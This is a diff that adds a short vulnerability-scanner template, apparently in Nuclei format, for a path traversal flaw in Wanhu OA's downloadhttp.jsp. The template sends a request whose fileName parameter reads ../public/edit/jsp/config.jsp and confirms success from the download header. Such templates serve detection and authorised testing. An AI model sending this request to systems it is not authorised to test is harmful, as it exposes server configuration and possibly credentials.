@@ -1,0 +1,19 @@
+id: wanhuOA_downloadhttp_download
+ 
+info:
+  name: wanhuOA_downloadhttp_download
+  author: sm
+  severity: critical
+  tags: wanhuOA
+ 
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp"
+    stop-at-first-match: true
+    redirects: true
+    matchers:
+      - type: word
+        words:
+          - "Content-Disposition: attachment; filename=\"../public/edit/jsp/config.jsp\""
+        part: header
